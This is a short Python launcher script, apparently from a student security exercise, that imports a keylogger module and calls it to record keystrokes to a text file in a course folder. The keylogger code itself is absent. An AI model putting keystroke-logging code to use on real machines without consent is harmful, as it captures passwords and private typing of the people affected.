from Keyloggers import keylogger1

def main():
    log_dir = r'D:\Documents\SRA 211'
    log_name = 'keystrokes.txt'

    keylogger1.getKeystrokes(log_dir, log_name)

if __name__== '__main__':
        main()